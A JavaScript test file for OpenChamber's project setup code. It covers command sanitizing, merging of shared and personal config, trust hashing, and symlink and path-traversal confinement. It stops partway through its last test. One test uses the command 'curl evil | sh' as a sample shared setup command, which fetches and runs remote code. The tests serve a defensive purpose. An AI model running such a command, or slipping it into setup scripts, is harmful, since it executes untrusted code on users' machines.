import { describe, expect, it } from 'vitest';
import express from 'express';
import request from 'supertest';
import { once } from 'node:events';
import os from 'os';
import path from 'path';
import { mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from 'fs/promises';

import { createProjectContextRuntime } from '../project-context/runtime.js';
import { registerProjectContextRoutes } from '../project-context/routes.js';
import { registerProjectSetupRoutes } from './routes.js';

import { createProjectConfigRuntime } from './project-config.js';
import { createProjectIdFromPath, projectPathFromId } from './project-id.js';
import {
  applySharedProjectSetupPatch,
  isSharedProjectConfigEmpty,
  mergeProjectSetup,
  normalizePlansDir,
  serializeSharedProjectConfig,
  parseSharedProjectConfig,
  sharedTrustHashOf,
  projectSetupPatchToStored,
  projectSetupViewOf,
  sanitizeDraftStarters,
  sanitizeProjectActions,
  sanitizeSetupCommands,
} from './project-setup.js';

const emptyPersonal = {
  setupWorktree: [],
  setupWorktreeWait: null,
  setupWorktreeMode: 'append',
  projectActions: [],
  projectActionsPrimaryId: null,
  draftStarters: [],
  hiddenSharedActionIds: [],
  sharedTrust: null,
};

const createRuntime = async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'oc-project-setup-'));
  const runtime = createProjectConfigRuntime({
    fsPromises: await import('fs/promises'),
    path,
    projectsDirPath: path.join(tempRoot, 'projects'),
    createTaskID: () => 'task-fixed-id',
  });
  return {
    runtime,
    tempRoot,
    readRaw: async (projectId) => JSON.parse(await readFile(path.join(tempRoot, 'projects', `${projectId}.json`), 'utf8')),
    cleanup: () => rm(tempRoot, { recursive: true, force: true }),
  };
};

describe('project setup sanitizers', () => {
  it('keeps only non-empty trimmed setup commands', () => {
    expect(sanitizeSetupCommands([' bun install ', '', 42, '\n'])).toEqual(['bun install']);
    expect(sanitizeSetupCommands('bun install')).toEqual([]);
  });

  it('drops actions without id, name, or command and duplicate ids', () => {
    expect(sanitizeProjectActions([
      { id: 'a', name: 'Dev', command: 'bun run dev' },
      { id: 'a', name: 'Again', command: 'x' },
      { id: '', name: 'No id', command: 'x' },
      { id: 'b', name: '', command: 'x' },
      'not an action',
    ])).toEqual([{ id: 'a', name: 'Dev', command: 'bun run dev', icon: null }]);
  });

  it('keeps only the optional action fields the user set', () => {
    expect(sanitizeProjectActions([{
      id: 'a',
      name: 'Dev',
      command: 'bun run dev',
      icon: ' rocket ',
      runIn: 'parent',
      platforms: ['macos', 'MacOS', 'plan9', 'linux'],
      autoOpenUrl: true,
      openUrl: 'http://localhost:3000',
      desktopOpenSshForward: '',
    }])).toEqual([{
      id: 'a',
      name: 'Dev',
      command: 'bun run dev',
      icon: 'rocket',
      autoOpenUrl: true,
      openUrl: 'http://localhost:3000',
      platforms: ['macos', 'linux'],
      runIn: 'parent',
    }]);
  });

  it('treats any runIn other than parent as the worktree default', () => {
    const [worktree, number] = sanitizeProjectActions([
      { id: 'a', name: 'A', command: 'x', runIn: 'worktree' },
      { id: 'b', name: 'B', command: 'x', runIn: 123 },
    ]);
    expect(worktree).not.toHaveProperty('runIn');
    expect(number).not.toHaveProperty('runIn');
  });

  it('dedupes draft starters by type and name', () => {
    expect(sanitizeDraftStarters([
      { type: 'skill', name: 'triage-prs' },
      { type: 'skill', name: 'triage-prs' },
      { type: 'command', name: ' explore ' },
      { type: 'agent', name: 'nope' },
    ])).toEqual([{ type: 'skill', name: 'triage-prs' }, { type: 'command', name: 'explore' }]);
  });

  it('builds the personal view from the on-disk keys and nulls a dangling primary action', () => {
    expect(projectSetupViewOf({
      'setup-worktree': ['bun install'],
      'setup-worktree-wait': true,
      setupWorktreeMode: 'replace',
      projectActions: [{ id: 'a', name: 'A', command: 'x' }],
      projectActionsPrimaryId: 'missing',
      draftStarters: [{ type: 'skill', name: 's' }],
      hiddenSharedActionIds: ['dev', '', 'dev', 7],
      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
      scheduledTasks: [{ id: 't' }],
    })).toEqual({
      setupWorktree: ['bun install'],
      setupWorktreeWait: true,
      setupWorktreeMode: 'replace',
      projectActions: [{ id: 'a', name: 'A', command: 'x', icon: null }],
      projectActionsPrimaryId: null,
      draftStarters: [{ type: 'skill', name: 's' }],
      hiddenSharedActionIds: ['dev'],
      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
    });
    expect(projectSetupViewOf(null)).toEqual(emptyPersonal);
  });

  it('maps a patch to the stored keys it names and rejects wrong shapes', () => {
    expect(projectSetupPatchToStored({
      setupWorktree: ['a'],
      projectActionsPrimaryId: null,
      hiddenSharedActionIds: ['x'],
      setupWorktreeMode: 'replace',
    })).toEqual({
      'setup-worktree': ['a'],
      projectActionsPrimaryId: undefined,
      hiddenSharedActionIds: ['x'],
      setupWorktreeMode: 'replace',
    });
    expect(projectSetupPatchToStored({})).toEqual({});
    expect(() => projectSetupPatchToStored({ setupWorktree: 'a' })).toThrow('setupWorktree must be');
    expect(() => projectSetupPatchToStored({ setupWorktreeWait: 'yes' })).toThrow('setupWorktreeWait must be');
    expect(() => projectSetupPatchToStored({ projectActions: {} })).toThrow('projectActions must be');
    expect(() => projectSetupPatchToStored({ draftStarters: null })).toThrow('draftStarters must be');
    expect(() => projectSetupPatchToStored({ hiddenSharedActionIds: 'dev' })).toThrow('hiddenSharedActionIds must be');
    expect(() => projectSetupPatchToStored({ setupWorktreeMode: 'merge' })).toThrow('setupWorktreeMode must be');
    expect(() => projectSetupPatchToStored({ sharedTrustHash: '' })).toThrow('sharedTrustHash must be');
    expect(projectSetupPatchToStored({ sharedTrustHash: null })).toEqual({ sharedTrust: undefined });
    expect(projectSetupPatchToStored({ sharedTrustHash: 'sha256:x' }).sharedTrust).toMatchObject({ hash: 'sha256:x' });
    expect(() => projectSetupPatchToStored([])).toThrow('patch must be');
  });
});

describe('shared project config', () => {
  it('accepts a relative plansDir inside the repo only', () => {
    expect(normalizePlansDir(' docs/plans/ ')).toBe('docs/plans');
    expect(normalizePlansDir('./.openchamber/plans')).toBe('.openchamber/plans');
    expect(normalizePlansDir('docs\\plans')).toBe('docs/plans');
    expect(normalizePlansDir('/etc')).toBeNull();
    expect(normalizePlansDir('C:/plans')).toBeNull();
    expect(normalizePlansDir('../sibling/plans')).toBeNull();
    expect(normalizePlansDir('docs/../../x')).toBeNull();
    expect(normalizePlansDir('')).toBeNull();
  });

  it('parses a version-1 file and sanitizes its lists', () => {
    expect(parseSharedProjectConfig(JSON.stringify({
      version: 1,
      setupWorktree: ['bun install', ''],
      setupWorktreeWait: true,
      projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }, { id: '', name: 'x', command: 'y' }],
      draftStarters: [{ type: 'skill', name: 's' }],
      plansDir: 'docs/plans',
    }))).toEqual({
      status: 'ok',
      config: {
        setupWorktree: ['bun install'],
        setupWorktreeWait: true,
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null }],
        draftStarters: [{ type: 'skill', name: 's' }],
        plansDir: 'docs/plans',
      },
    });
    expect(parseSharedProjectConfig('{"version":1}')).toEqual({
      status: 'ok',
      config: { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [], plansDir: null },
    });
  });

  it('reports a broken file as invalid with a reason, never as empty', () => {
    expect(parseSharedProjectConfig('{ nope').status).toBe('invalid');
    expect(parseSharedProjectConfig('[]')).toEqual({ status: 'invalid', reason: 'not an object' });
    expect(parseSharedProjectConfig('{"version":2}').reason).toMatch(/unsupported version/);
    expect(parseSharedProjectConfig('{"version":1,"setupWorktree":"bun install"}').reason).toMatch(/setupWorktree must be/);
    expect(parseSharedProjectConfig('{"version":1,"plansDir":"/etc"}').reason).toMatch(/plansDir/);
  });

  it('merges shared and personal by the agreed rules', () => {
    const shared = {
      status: 'ok',
      config: {
        setupWorktree: ['bun install'],
        setupWorktreeWait: true,
        projectActions: [
          { id: 'dev', name: 'Dev', command: 'bun run dev', icon: null },
          { id: 'test', name: 'Test', command: 'bun test', icon: null },
          { id: 'lint', name: 'Lint', command: 'bun lint', icon: null },
        ],
        draftStarters: [{ type: 'skill', name: 'shared-skill' }, { type: 'command', name: 'both' }],
        plansDir: 'docs/plans',
      },
    };
    const personal = {
      ...emptyPersonal,
      setupWorktree: ['cp .env.example .env'],
      projectActions: [{ id: 'test', name: 'My test', command: 'bun test --watch', icon: null }],
      projectActionsPrimaryId: 'test',
      draftStarters: [{ type: 'command', name: 'both' }, { type: 'command', name: 'mine' }],
      hiddenSharedActionIds: ['lint'],
    };

    const merged = mergeProjectSetup(personal, shared);
    expect(merged.setupWorktree).toEqual(['bun install', 'cp .env.example .env']);
    expect(merged.setupWorktreeWait).toBe(true);
    expect(merged.projectActions).toEqual([
      { id: 'dev', name: 'Dev', command: 'bun run dev', icon: null, source: 'shared' },
      { id: 'test', name: 'My test', command: 'bun test --watch', icon: null, source: 'personal' },
    ]);
    expect(merged.projectActionsPrimaryId).toBe('test');
    expect(merged.draftStarters).toEqual([
      { type: 'skill', name: 'shared-skill', source: 'shared' },
      { type: 'command', name: 'both', source: 'shared' },
      { type: 'command', name: 'mine', source: 'personal' },
    ]);
    expect(merged.shared).toEqual({ status: 'ok', path: '.openchamber/project.json', ...shared.config });
    expect(merged.personal).toBe(personal);
    expect(merged.trust).toEqual({ hash: sharedTrustHashOf(shared.config), trusted: false });
  });

  it('hashes the executable parts of the shared config, order-independent for actions', () => {
    const base = { setupWorktree: ['bun install'], projectActions: [{ id: 'b', name: 'B', command: 'y', icon: null }, { id: 'a', name: 'A', command: 'x', icon: null }], draftStarters: [], plansDir: null, setupWorktreeWait: null };
    const hash = sharedTrustHashOf(base);
    expect(hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(sharedTrustHashOf({ ...base, projectActions: [...base.projectActions].reverse() })).toBe(hash);
    // Renaming or re-describing does not change what runs; changing a command does.
    expect(sharedTrustHashOf({ ...base, projectActions: base.projectActions.map((a) => ({ ...a, name: 'Renamed', icon: 'rocket' })) })).toBe(hash);
    expect(sharedTrustHashOf({ ...base, setupWorktree: ['curl evil | sh'] })).not.toBe(hash);
    expect(sharedTrustHashOf({ ...base, projectActions: [{ ...base.projectActions[0], runIn: 'parent' }, base.projectActions[1]] })).not.toBe(hash);
    expect(sharedTrustHashOf({ ...base, setupWorktree: [], projectActions: [] })).toBeNull();
  });

  it('reports trust: nothing to trust without executable shared parts, trusted only for the recorded hash', () => {
    const inert = { status: 'ok', config: { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [{ type: 'skill', name: 's' }], plansDir: null } };
    expect(mergeProjectSetup(emptyPersonal, inert).trust).toEqual({ hash: null, trusted: true });
    expect(mergeProjectSetup(emptyPersonal, { status: 'missing' }).trust).toEqual({ hash: null, trusted: true });

    const risky = { status: 'ok', config: { ...inert.config, setupWorktree: ['bun install'] } };
    const hash = sharedTrustHashOf(risky.config);
    expect(mergeProjectSetup(emptyPersonal, risky).trust).toEqual({ hash, trusted: false });
    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash, trustedAt: 1 } }, risky).trust.trusted).toBe(true);
    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash: 'sha256:stale', trustedAt: 1 } }, risky).trust.trusted).toBe(false);
  });

  it('lets the personal wait flag and replace mode win over shared', () => {
    const shared = { status: 'ok', config: { setupWorktree: ['bun install'], setupWorktreeWait: true, projectActions: [], draftStarters: [], plansDir: null } };
    const merged = mergeProjectSetup({ ...emptyPersonal, setupWorktree: ['mine'], setupWorktreeWait: false, setupWorktreeMode: 'replace' }, shared);
    expect(merged.setupWorktree).toEqual(['mine']);
    expect(merged.setupWorktreeWait).toBe(false);
  });

  it('carries an invalid shared read through with its reason and merges nothing from it', () => {
    const merged = mergeProjectSetup({ ...emptyPersonal, setupWorktree: ['mine'] }, { status: 'invalid', reason: 'invalid JSON: x' });
    expect(merged.setupWorktree).toEqual(['mine']);
    expect(merged.shared.status).toBe('invalid');
    expect(merged.shared.reason).toBe('invalid JSON: x');
    expect(merged.shared.projectActions).toEqual([]);
  });
});

describe('shared project config writes', () => {
  const empty = { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [], plansDir: null };

  it('applies a patch over the current config and refuses wrong shapes', () => {
    const next = applySharedProjectSetupPatch({ ...empty, setupWorktree: ['old'] }, {
      projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev', source: 'personal', icon: '' }],
      plansDir: './docs/plans/',
    });
    expect(next.setupWorktree).toEqual(['old']);
    expect(next.projectActions).toEqual([{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null }]);
    expect(next.plansDir).toBe('docs/plans');
    expect(applySharedProjectSetupPatch(next, { plansDir: '' }).plansDir).toBeNull();
    expect(() => applySharedProjectSetupPatch(empty, { plansDir: '/etc' })).toThrow('plansDir must be');
    expect(() => applySharedProjectSetupPatch(empty, { setupWorktree: 'x' })).toThrow('setupWorktree must be');
    expect(() => applySharedProjectSetupPatch(empty, { setupWorktreeWait: 'yes' })).toThrow('setupWorktreeWait must be');
  });

  it('serializes version first, only the keys that carry something, without source marks', () => {
    expect(serializeSharedProjectConfig({ ...empty, projectActions: [{ id: 'dev', name: 'Dev', command: 'x', icon: null, source: 'personal' }], plansDir: 'docs/plans' })).toBe([
      '{',
      '  "version": 1,',
      '  "projectActions": [',
      '    {',
      '      "id": "dev",',
      '      "name": "Dev",',
      '      "command": "x"',
      '    }',
      '  ],',
      '  "plansDir": "docs/plans"',
      '}',
      '',
    ].join('\n'));
    expect(isSharedProjectConfigEmpty(empty)).toBe(true);
    expect(isSharedProjectConfigEmpty({ ...empty, setupWorktreeWait: false })).toBe(false);
  });
});

describe('project id', () => {
  it('round-trips a path through the id', () => {
    const id = createProjectIdFromPath('/Users/me/projects/repo/');
    expect(id.startsWith('path_')).toBe(true);
    expect(projectPathFromId(id)).toBe('/Users/me/projects/repo');
    expect(projectPathFromId('project-test')).toBe('');
    expect(projectPathFromId('path_')).toBe('');
  });
});

describe('disabled shared writes preserve explicit complete-set approval', () => {
  it('shared discovery is disabled at the real client/worktree path while personal setup and stored approval survive', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    const { configureRuntimeUrlResolver } = await import('@openchamber/ui/lib/runtime-url');
    const { updateSharedProjectSetup } = await import('@openchamber/ui/lib/openchamberConfig');
    const {
      resolveWorktreeSetupCommands, settleSharedTrustConfirmation,
      getSharedTrustConfirmationSnapshot,
    } = await import('@openchamber/ui/lib/sharedTrustConfirmation');
    const app = express();
    app.use(express.json());
    registerProjectSetupRoutes(app, { projectConfigRuntime: runtime });
    const server = app.listen(0, '127.0.0.1');
    await once(server, 'listening');
    const address = server.address();
    configureRuntimeUrlResolver({ apiBaseUrl: `http://127.0.0.1:${address.port}` });
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      const sharedPath = path.join(repo, '.openchamber', 'project.json');
      const sharedRaw = {
        version: 1, setupWorktree: ['echo repository-setup'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'echo repository-action' }],
      };
      await writeFile(sharedPath, JSON.stringify(sharedRaw));
      const projectId = createProjectIdFromPath(repo);
      const project = { id: projectId, path: repo };
      await runtime.updateProjectSetup(projectId, { setupWorktree: ['echo personal-setup'] });
      const approval = { hash: 'sha256:previous-explicit-approval', trustedAt: 17 };
      const personalPath = path.join(tempRoot, 'projects', `${projectId}.json`);
      const personalRaw = await readRaw(projectId);
      await writeFile(personalPath, JSON.stringify({ ...personalRaw, sharedTrust: approval }));
      const sharedBefore = await readFile(sharedPath, 'utf8');
      const personalBefore = await readFile(personalPath, 'utf8');
      for (const patch of [
        { plansDir: 'docs/plans' },
        { draftStarters: [{ type: 'skill', name: 'triage' }] },
        { draftStarters: [] }, {}, { futureKey: true, sharedTrustHash: approval.hash },
      ]) {
        expect(await updateSharedProjectSetup(project, patch)).toBeNull();
        const saved = await runtime.readProjectSetup(projectId);
        expect(saved.shared.status).toBe('invalid');
        expect(saved.shared.reason).toBe('shared-project-config-disabled');
        expect(saved.shared.setupWorktree).toEqual([]);
        expect(saved.shared.projectActions).toEqual([]);
        expect(saved.shared.draftStarters).toEqual([]);
        expect(saved.trust).toEqual({ hash: null, trusted: true });
        expect(saved.personal.sharedTrust).toEqual(approval);
        expect(await resolveWorktreeSetupCommands(project)).toEqual(['echo personal-setup']);
        expect(getSharedTrustConfirmationSnapshot()).toBeNull();
        expect(await readFile(personalPath, 'utf8')).toBe(personalBefore);
        expect(await readFile(sharedPath, 'utf8')).toBe(sharedBefore);
      }
      expect((await readRaw(projectId)).sharedTrust).toEqual(approval);
      for (const patch of [
        { plansDir: 'other/plans' }, { draftStarters: [{ type: 'command', name: 'explore' }] },
        { draftStarters: [] }, { setupWorktreeWait: true },
        { projectActions: [{ id: 'dev', name: 'Renamed', icon: 'rocket', command: 'echo repository-action' }] }, {},
      ]) {
        expect(await updateSharedProjectSetup(project, patch)).toBeNull();
        expect((await runtime.readProjectSetup(projectId)).trust.trusted).toBe(true);
        expect((await readRaw(projectId)).sharedTrust).toEqual(approval);
        expect(await resolveWorktreeSetupCommands(project)).toEqual(['echo personal-setup']);
        expect(getSharedTrustConfirmationSnapshot()).toBeNull();
      }
      for (const action of [
        { id: 'dev', name: 'Changed command', command: 'echo new-command' },
        { id: 'dev', name: 'Changed runIn', command: 'echo new-command', runIn: 'parent' },
      ]) {
        // A repository pull, followed by an unrelated metadata save, cannot approve the changed tuple.
        const currentRaw = JSON.parse(await readFile(sharedPath, 'utf8'));
        await writeFile(sharedPath, JSON.stringify({ ...currentRaw, projectActions: [action] }));
        const personalBefore = await readRaw(projectId);
        expect(await updateSharedProjectSetup(project, { plansDir: 'docs/plans' })).toBeNull();
        const saved = await runtime.readProjectSetup(projectId);
        expect(saved.shared.status).toBe('invalid');
        expect(saved.shared.projectActions).toEqual([]);
        expect(await readRaw(projectId)).toEqual(personalBefore);
        expect(await resolveWorktreeSetupCommands(project)).toEqual(['echo personal-setup']);
        expect(getSharedTrustConfirmationSnapshot()).toBeNull();
      }
      await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
      expect(await updateSharedProjectSetup(project, {
        projectActions: [{ id: 'mine', name: 'Mine', command: 'echo known-personal' }],
      })).toBeNull();
      expect((await runtime.readProjectSetup(projectId)).personal.sharedTrust).toBeNull();
      expect(await resolveWorktreeSetupCommands(project)).toEqual(['echo personal-setup']);
    } finally {
      settleSharedTrustConfirmation('skip');
      configureRuntimeUrlResolver({});
      await new Promise((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
      await cleanup();
    }
  });

  it('refuses shared saves without changing stale approval and serializes personal writes', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      const projectId = createProjectIdFromPath(repo);
      const sharedPath = path.join(repo, '.openchamber', 'project.json');
      const initial = { version: 1, setupWorktree: ['echo unseen'], projectActions: [{ id: 'dev', name: 'Dev', command: 'echo dev' }] };
      await writeFile(sharedPath, JSON.stringify(initial));
      await mkdir(path.join(tempRoot, 'projects'), { recursive: true });
      await writeFile(path.join(tempRoot, 'projects', `${projectId}.json`), JSON.stringify({
        version: 1, scheduledTasks: [{ id: 'keep' }], futureKey: { keep: true },
        'setup-worktree': ['echo personal'], sharedTrust: { hash: 'sha256:stale', trustedAt: 7 },
      }));
      await runtime.updateProjectSetup('other-project', { sharedTrustHash: 'sha256:other' });
      const other = await readRaw('other-project');
      await expect(runtime.updateSharedProjectSetup(projectId, {})).rejects.toThrow('shared-project-config-writes-disabled');
      expect((await runtime.readProjectSetup(projectId)).shared.status).toBe('invalid');
      expect((await readRaw(projectId)).sharedTrust).toEqual({ hash: 'sha256:stale', trustedAt: 7 });
      for (const change of [
        { ...initial, setupWorktree: ['echo changed'] },
        { ...initial, projectActions: [{ ...initial.projectActions[0], runIn: 'parent' }] },
      ]) {
        await writeFile(sharedPath, JSON.stringify(initial));
        const approved = await runtime.updateProjectSetup(projectId, { sharedTrustHash: 'sha256:explicit-personal-write' });
        expect(approved.personal.sharedTrust.hash).toBe('sha256:explicit-personal-write');
        await writeFile(sharedPath, JSON.stringify(change));
        expect((await runtime.readProjectSetup(projectId)).shared.status).toBe('invalid');
        const personalBefore = await readRaw(projectId);
        await expect(runtime.updateSharedProjectSetup(projectId, { plansDir: 'docs/plans' })).rejects.toThrow('shared-project-config-writes-disabled');
        const patched = await runtime.readProjectSetup(projectId);
        expect(patched.shared.status).toBe('invalid');
        expect(await readRaw(projectId)).toEqual(personalBefore);
        expect(patched.shared.projectActions).toEqual([]);
      }
      await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
      await expect(runtime.updateSharedProjectSetup(projectId, {
        projectActions: [...initial.projectActions, { id: 'mine', name: 'Mine', command: 'echo known-personal' }],
      })).rejects.toThrow('shared-project-config-writes-disabled');
      const shared = await runtime.readProjectSetup(projectId);
      expect(shared.shared.setupWorktree).toEqual([]);
      expect(shared.shared.status).toBe('invalid');
      expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
      await runtime.updateProjectSetup(projectId, { sharedTrustHash: 'sha256:explicit-personal-write' });
      const approval = (await readRaw(projectId)).sharedTrust;
      await Promise.all([
        expect(runtime.updateSharedProjectSetup(projectId, { plansDir: 'new/plans' })).rejects.toThrow('shared-project-config-writes-disabled'),
        expect(runtime.updateSharedProjectSetup(projectId, { draftStarters: [{ type: 'skill', name: 's' }] })).rejects.toThrow('shared-project-config-writes-disabled'),
        runtime.updateProjectSetup(projectId, { setupWorktree: ['echo personal-updated'] }),
        runtime.updateProjectSetup(projectId, { draftStarters: [{ type: 'skill', name: 'personal' }] }),
      ]);
      const raw = await readRaw(projectId);
      expect(raw.sharedTrust).toEqual(approval);
      expect(raw.scheduledTasks).toEqual([{ id: 'keep' }]);
      expect(raw.futureKey).toEqual({ keep: true });
      expect(raw['setup-worktree']).toEqual(['echo personal-updated']);
      const current = await runtime.readProjectSetup(projectId);
      expect(current.shared.plansDir).toBeNull();
      expect(current.shared.draftStarters).toEqual([]);
      expect(current.personal.draftStarters).toEqual([{ type: 'skill', name: 'personal' }]);
      expect(await readRaw('other-project')).toEqual(other);
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: 'bad' })).rejects.toThrow('shared-project-config-writes-disabled');
      expect(await readRaw(projectId)).toEqual(raw);
      await rm(path.dirname(sharedPath), { recursive: true });
      await writeFile(path.dirname(sharedPath), 'not a directory');
      const personalPath = path.join(tempRoot, 'projects', `${projectId}.json`);
      const personalBefore = await readFile(personalPath, 'utf8');
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: ['echo never-approved'] })).rejects.toThrow();
      expect(await readFile(personalPath, 'utf8')).toBe(personalBefore);
    } finally {
      await cleanup();
    }
  });
});

describe('shared config confinement at the production routes', () => {
  it.each(['directory-link', 'dangling-directory-link', 'file-link', 'inside-directory-link'])(
    'refuses shared reads and metadata/removal writes through %s without outside effects', async (layout) => {
      const { runtime, tempRoot, cleanup } = await createRuntime();
      try {
        const repo = path.join(tempRoot, 'repo');
        const outside = path.join(tempRoot, 'outside');
        const outsidePath = path.join(outside, 'project.json');
        const sentinel = JSON.stringify({ version: 1, plansDir: 'old/plans', draftStarters: [{ type: 'skill', name: 'outside-only' }] });
        await mkdir(repo);
        await mkdir(outside);
        await writeFile(outsidePath, sentinel);
        const configDir = path.join(repo, '.openchamber');
        if (layout === 'file-link') {
          await mkdir(configDir);
          await symlink(outsidePath, path.join(configDir, 'project.json'));
        } else if (layout === 'inside-directory-link') {
          const child = path.join(repo, 'child');
          await mkdir(child);
          await writeFile(path.join(child, 'project.json'), sentinel);
          await symlink(child, configDir);
        } else {
          await symlink(layout === 'directory-link' ? outside : path.join(outside, 'absent'), configDir);
        }
        const projectId = createProjectIdFromPath(repo);
        const app = express();
        app.use(express.json());
        registerProjectSetupRoutes(app, { projectConfigRuntime: runtime });
        const endpoint = `/api/projects/${projectId}/config`;
        for (const patch of [{ plansDir: 'new/plans' }, { plansDir: null, draftStarters: [] }]) {
          const saved = await request(app).put(`${endpoint}/shared`).send(patch);
          expect(saved.status).toBe(500);
          expect(saved.body.error).toBe('shared-project-config-writes-disabled');
          expect(await readFile(outsidePath, 'utf8')).toBe(sentinel);
          expect(await readdir(outside)).toEqual(['project.json']);
          if (layout !== 'dangling-directory-link') expect(await readFile(path.join(configDir, 'project.json'), 'utf8')).toBe(sentinel);
        }
        const read = await request(app).get(endpoint);
        expect(read.status).toBe(200);
        expect(read.body.shared.status).toBe('invalid');
        expect(read.body.shared.reason).toBe('shared-project-config-disabled');
        expect(read.body.shared.path).toBe('.openchamber/project.json');
        expect(read.body.shared.draftStarters).toEqual([]);
        expect(JSON.stringify(read.body)).not.toContain(repo);
      } finally {
        await cleanup();
      }
    },
  );
});

describe('shared config zero-IO cut', () => {
  it('refuses the real parent-swap sequence before mkdir and reads no checkout data', async () => {
    const { tempRoot, cleanup } = await createRuntime();
    const realFs = await import('fs/promises');
    try {
      const repo = path.join(tempRoot, 'repo');
      const directory = path.join(repo, '.openchamber');
      const sharedPath = path.join(directory, 'project.json');
      const outside = path.join(tempRoot, 'outside');
      await mkdir(directory, { recursive: true });
      await mkdir(outside);
      const bytes = JSON.stringify({ version: 1, plansDir: 'inside/plans' });
      await writeFile(sharedPath, bytes);
      await writeFile(path.join(outside, 'project.json'), 'outside sentinel');
      let swaps = 0;
      let checkoutReads = 0;
      const refuseCheckout = async () => { checkoutReads += 1; throw new Error('checkout IO forbidden'); };
      const runtime = createProjectConfigRuntime({
        path, projectsDirPath: path.join(tempRoot, 'projects'),
        fsPromises: {
          ...realFs,
          stat: refuseCheckout, realpath: refuseCheckout, open: refuseCheckout, readlink: refuseCheckout,
          mkdir: async (target, options) => {
            if (target === directory) {
              swaps += 1;
              await realFs.rename(directory, path.join(repo, 'moved'));
              await realFs.symlink(outside, directory);
            }
            return realFs.mkdir(target, options);
          },
          readFile: async (target, ...options) => {
            if (String(target).startsWith(repo)) { checkoutReads += 1; throw new Error('checkout read forbidden'); }
            return realFs.readFile(target, ...options);
          },
        },
      });
      const app = express();
      app.use(express.json());
      registerProjectSetupRoutes(app, { projectConfigRuntime: runtime });
      const endpoint = `/api/projects/${createProjectIdFromPath(repo)}/config`;
      const saved = await request(app).put(`${endpoint}/shared`).send({ plansDir: 'new/plans' });
      expect(saved.status).toBe(500);
      expect(saved.body.error).toBe('shared-project-config-writes-disabled');
      expect(swaps).toBe(0);
      const read = await request(app).get(endpoint);
      expect(read.body.shared.status).toBe('invalid');
      expect(read.body.shared.reason).toBe('shared-project-config-disabled');
      expect(checkoutReads).toBe(0);
      expect(JSON.stringify(read.body)).not.toContain(repo);
      expect(await readFile(sharedPath, 'utf8')).toBe(bytes);
      expect(await readFile(path.join(outside, 'project.json'), 'utf8')).toBe('outside sentinel');
    } finally {
      await cleanup();
    }
  });

  it('refuses shared reads and edits even for canonical checkout aliases and absent or ordinary config', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo);
      const alias = path.join(tempRoot, 'alias');
      await symlink(repo, alias);
      const projectId = createProjectIdFromPath(alias);
      expect((await runtime.readProjectSetup(projectId)).shared.status).toBe('invalid');
      await expect(runtime.updateSharedProjectSetup(projectId, {})).rejects.toThrow('shared-project-config-writes-disabled');
      expect(await readdir(repo)).toEqual([]);
      const directory = path.join(repo, '.openchamber');
      await mkdir(directory);
      expect((await runtime.readProjectSetup(projectId)).shared.status).toBe('invalid');
      const sharedPath = path.join(directory, 'project.json');
      await mkdir(sharedPath);
      expect((await runtime.readProjectSetup(projectId)).shared.status).toBe('invalid');
      await rm(sharedPath, { recursive: true });
      const bytes = '{ "version": 1, "setupWorktree": ["echo safe"] }\n';
      await writeFile(sharedPath, bytes);
      const view = await runtime.readProjectSetup(projectId);
      expect(view.shared.status).toBe('invalid');
      expect(view.shared.reason).toBe('shared-project-config-disabled');
      expect(view.setupWorktree).toEqual([]);
      const personal = await runtime.updateProjectSetup(projectId, { setupWorktree: ['echo personal'], sharedTrustHash: 'sha256:explicit-personal-write' });
      expect(personal.setupWorktree).toEqual(['echo personal']);
      expect(personal.personal.sharedTrust.hash).toBe('sha256:explicit-personal-write');
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: [] })).rejects.toThrow('shared-project-config-writes-disabled');
      expect(await readFile(sharedPath, 'utf8')).toBe(bytes);
    } finally {
      await cleanup();
    }
  });
});

describe('production shared-plan disable', () => {
  it('direct shared access cannot create a personal manifest or move an outside sentinel', async () => {
    const { runtime: config, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      const outside = path.join(tempRoot, 'outside');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await mkdir(outside);
      await writeFile(path.join(outside, 'sentinel.md'), '# Outside\n\nUntouched');
      await symlink(outside, path.join(repo, '.openchamber', 'plans'));
      const projectId = createProjectIdFromPath(repo);
      const context = createProjectContextRuntime({
        fsPromises: await import('fs/promises'), path,
        projectsDirPath: path.join(tempRoot, 'projects'),
        resolveSharedPlansDir: (id) => config.resolveSharedPlansDir(id),
      });
      expect((await context.readContext(projectId)).plans).toEqual([]);
      expect(await context.readPlan(projectId, 'shared:sentinel.md')).toBeNull();
      expect(await context.updatePlan(projectId, 'shared:sentinel.md', { raw: '# Overwritten' })).toBeNull();
      expect((await context.deletePlan(projectId, 'shared:sentinel.md')).deleted).toBe(false);
      expect(await context.setPlanPinned(projectId, 'shared:sentinel.md', true)).toBeNull();
      expect(await context.unsharePlan(projectId, 'shared:sentinel.md')).toBeNull();
